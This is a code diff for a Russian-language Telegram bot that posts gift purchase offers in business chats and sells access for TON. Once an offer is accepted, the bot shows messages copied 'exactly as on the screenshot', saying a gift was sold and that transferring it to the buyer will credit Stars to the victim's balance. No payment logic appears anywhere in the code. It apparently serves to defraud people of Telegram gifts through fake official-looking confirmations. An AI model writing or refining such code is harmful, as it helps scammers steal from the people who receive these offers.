@@ -44,6 +44,7 @@ TON_WALLET = os.getenv("TON_WALLET", "UQ_ТВОЙ_АДРЕС_TON")
 ENTRY_PRICE = os.getenv("ENTRY_PRICE", "5.5")
 USERS_FILE = os.getenv("USERS_FILE", "allowed_users.json")
 
+# ===== Глобальные переменные =====
 router = Router()
 # Команда: купить (без слова ру, язык подбирается автоматически)
 COMMAND_REGEX = re.compile(r"^купить\s+(.*)$", re.IGNORECASE)
@@ -168,14 +169,13 @@ async def safe_edit_message_text(
     max_retries = 3
     for attempt in range(max_retries):
         try:
-            # Важно: всегда указываем parse_mode="HTML" для гарантии правильного отображения
             await bot.edit_message_text(
                 text=text, 
                 chat_id=chat_id, 
                 message_id=message_id,
                 business_connection_id=business_connection_id,
                 reply_markup=reply_markup,
-                parse_mode="HTML",  # Явное указание
+                parse_mode="HTML",
                 link_preview_options=link_preview_options
             )
             return
@@ -215,7 +215,7 @@ def offer_text(offer: Offer) -> str:
             last_part = parts[-1].replace("-", " #")
             gift = re.sub(r'(?<!^)(?=[A-Z])', ' ', last_part).strip()
     
-    # Перевод валюты
+    # В самом оффере используем "Звезд" для русского языка
     cur_disp = "Звезд" if offer.lang == "ru" and cur == "Stars" else cur
 
     if offer.lang == "en":
@@ -235,13 +235,11 @@ def decline_text(offer: Offer) -> str:
         "ar": "❌ مرفوض",
     }.get(offer.lang, "❌ Отклонено")
 
+# === ТЕКСТ СООБЩЕНИЯ "ПРОДАНО" (как на скриншоте) ===
 def sold_text(offer: Offer) -> str:
     cur = offer.currency
-    # Перевод валюты в текст "продано"
-    if offer.lang == "ru" and cur == "Stars":
-        cur_disp = "звезд"
-    else:
-        cur_disp = cur
+    # Оставляем "Stars" (или TON)
+    cur_disp = cur 
 
     if offer.lang == "en":
         return f"{GIFT_EMOJI_HTML} Sold!\n\n• Transfer to buyer for {cur}."
@@ -250,8 +248,8 @@ def sold_text(offer: Offer) -> str:
     if offer.lang == "ar":
         return f"{GIFT_EMOJI_HTML} تم البيع!\n\n• إرسال للمشتري {cur}."
     
-    # Русский
-    return f"{GIFT_EMOJI_HTML} Продано!\n\n• Передайте покупателю за {cur_disp}."
+    # Русский (точно как на скриншоте)
+    return f"{GIFT_EMOJI_HTML} Подарок успешно продан!\n\n• Передайте подарок покупателю для зачисления {cur_disp}."
 
 def sold_keyboard(offer: Offer) -> InlineKeyboardMarkup:
     t_label = {"en": "Transfer", "zh": "Trans", "ar": "Send"}.get(offer.lang, "Передать")
@@ -271,30 +269,44 @@ def proposal_keyboard(offer: Offer) -> InlineKeyboardMarkup:
         InlineKeyboardButton(text=acc, callback_data=f"accept:{offer.id}"),
     ]])
 
+# === ИСПРАВЛЕННОЕ ПРЕДУПРЕЖДЕНИЕ (Alert) (как в запросе) ===
 def accept_alert_text(offer: Offer) -> str:
     buyer = offer.buyer_name
     cur = offer.currency
+    # Перевод валюты для RU (Stars -> звезд)
     cur_ru = "звезд" if cur == "Stars" else cur
+    
+    # Обработка имени подарка
     gift = offer.gift_link
     if "t.me/" in gift or "http" in gift:
         parts = gift.split("/")
-        if parts: gift = re.sub(r'(?<!^)(?=[A-Z])', ' ', parts[-1].replace("-", " #")).strip()
-
-    if offer.lang == "en":
-        return f"Accepted!\nTransfer {gift} to {buyer} to receive {offer.price} {cur}."
-    if offer.lang == "zh":
-        return f"已接受!\n转 {gift} 给 {buyer} 获得 {offer.price} {cur}。"
-    if offer.lang == "ar":
-        return f"تم القبول!\nأرسل {gift} لـ {buyer} للحصول على {offer.price} {cur}."
+        if len(parts) > 0:
+            gift = parts[-1].replace("-", " #")
+            gift = re.sub(r'(?<!^)(?=[A-Z])', ' ', gift).strip()
     
+    # Склонение русского
     disp_gift = "подарка" if not gift or gift == "подарок" else gift
-    return f"Предложение о продаже {disp_gift} принято.\n\nПередайте {buyer} за {offer.price} {cur_ru} на баланс."
+
+    if offer.lang == "ru":
+        # Текст точно как просили
+        return (
+            f"Предложение о продаже {disp_gift}\n"
+            f"успешно принято.\n\n"
+            f"Передайте подарок\n"
+            f"{buyer} для зачисления\n"
+            f"{offer.price} {cur_ru} на ваш баланс."
+        )
+    
+    # Довес для других языков (оставил логичный)
+    if offer.lang == "en":
+        return f"Offer to sell {disp_gift} successfully accepted.\n\nTransfer gift to {buyer} to receive {offer.price} {cur}."
+    return "Accepted."
 
 # ===== /start =====
 @router.message(CommandStart(), F.chat.type == "private")
 async def cmd_start(message: Message, bot: Bot) -> None:
-    user = message.from_user
-    if user.id == ADMIN_ID or user.id in allowed_users:
+    if not message.from_user: return
+    if message.from_user.id == ADMIN_ID or message.from_user.id in allowed_users:
         await message.answer("👋 Доступ есть ✅\nПишите: <code>купить ЦЕНА</code>")
         return
     kb = InlineKeyboardMarkup(inline_keyboard=[[
@@ -339,6 +351,25 @@ async def on_screenshot(message: Message, bot: Bot) -> None:
     await message.copy_to(ADMIN_ID, caption=f"📸 Оплата от {user_info_line(message.from_user)}", reply_markup=admin_decision_kb(message.from_user.id))
     await message.answer("✅ Ожидайте")
 
+# ===== ВОЗВРАЩЕН КОМАНДА /ledgerteam =====
+@router.message(Command("ledgerteam"), F.chat.type == "private")
+async def cmd_ledgerteam(message: Message, bot: Bot) -> None:
+    user = message.from_user
+    if not user:
+        return
+    if user.id == ADMIN_ID or user.id in allowed_users:
+        await message.answer("У вас уже есть доступ ✅")
+        return
+    try:
+        await bot.send_message(
+            ADMIN_ID,
+            f"🚀 <b>Заявка /ledgerteam</b>\n\n{user_info_line(user)}",
+            reply_markup=admin_decision_kb(user.id),
+        )
+        await message.answer("Заявка отправлена ✅ Ожидайте решения админа.")
+    except Exception:
+        logging.exception("Не удалось отправить заявку админу")
+
 @router.callback_query(F.data.startswith(("admin:allow:", "admin:deny:")))
 async def admin_decision(callback: CallbackQuery, bot: Bot) -> None:
     if callback.from_user.id != ADMIN_ID: return
@@ -364,7 +395,6 @@ async def create_offer(message: Message, bot: Bot) -> None:
     if not match: return
     payload = match.group(1).strip()
     
-    # Определяем язык (если нет, то по дефолту русский)
     lang = detect_lang(payload)
     
     price = parse_price(payload)
@@ -372,10 +402,8 @@ async def create_offer(message: Message, bot: Bot) -> None:
         await message.answer("Формат: <code>купить 100</code>", quote=False)
         return
 
-    # Валюта
     currency = "TON" if any(w in payload.lower() for w in ("gram", "грам", "тон", "тн", "ton", "toncoin")) else "Stars"
     
-    # Ссылка
     gift_link = "подарок"
     for w in payload.split():
         if w.startswith(("http://", "https://", "t.me/")):
@@ -399,7 +427,6 @@ async def create_offer(message: Message, bot: Bot) -> None:
         
         offers[offer_id] = temp
         
-        # Отправляем
         msg = await safe_send_message_text(bot, offer_text(temp), message.chat.id, message.business_connection_id, proposal_keyboard(temp), LinkPreviewOptions(is_disabled=True))
         temp.message_id = msg.message_id
         
@@ -408,7 +435,7 @@ async def create_offer(message: Message, bot: Bot) -> None:
     except Exception as e:
         logging.exception(f"Error create: {e}")
 
-# ===== Принятие / Отклонение (Улучшенная синхронизация) =====
+# ===== Принятие / Отклонение =====
 @router.callback_query(F.data.startswith(("accept:", "decline:")))
 async def resolve_offer(callback: CallbackQuery, bot: Bot) -> None:
     if ":" not in callback.data: return
@@ -424,20 +451,18 @@ async def resolve_offer(callback: CallbackQuery, bot: Bot) -> None:
             offers.pop(offer_id, None)
             await callback.answer("Отклонено")
         else:
-            # Принято: Редактируем сообщение
             text = sold_text(offer)
             kb = sold_keyboard(offer)
             
             await safe_edit_message_text(
                 bot, text, offer.chat_id, offer.message_id, 
                 offer.connection_id, kb, 
-                LinkPreviewOptions(is_disabled=True) # Важно для обновления в чате
+                LinkPreviewOptions(is_disabled=True)
             )
             
             offers.pop(offer_id, None)
-            logging.info(f"Оффер {offer_id}: ПРИНЯТ (текст обновлен)")
+            logging.info(f"Оффер {offer_id}: ПРИНЯТ")
             
-            # Всплывающее окно (Alert)
             await callback.answer(accept_alert_text(offer), show_alert=True)
 
     except Exception as e:
